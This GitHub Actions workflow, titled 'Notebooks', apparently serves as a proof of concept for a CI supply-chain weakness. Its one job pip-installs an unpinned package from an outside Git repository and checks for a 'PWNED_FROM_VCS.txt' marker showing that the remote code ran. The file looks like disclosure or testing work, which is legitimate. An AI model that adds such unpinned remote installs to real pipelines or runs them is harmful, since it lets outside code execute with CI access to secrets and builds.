name: Notebooks

on:
  pull_request:
    paths:
      - "**.ipynb"
  workflow_dispatch:

jobs:
  poc-vcs-install:
    if: github.event_name == 'workflow_dispatch'
    name: PoC â€“ VCS install (unpinned)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v6
        with:
          python-version: '3.11'
      - name: Install (unpinned) from VCS
        run: |
          python3 -m pip install -U "git+https://github.com/reconsumeralization/tfdocs-poc-20250922181610"
      - name: Verify PoC marker
        run: |
          ls -la
          if test -f PWNED_FROM_VCS.txt; then
            echo "[POC] Marker present:"
            cat PWNED_FROM_VCS.txt
          else
            echo "[POC] Marker missing"; exit 1
          fi
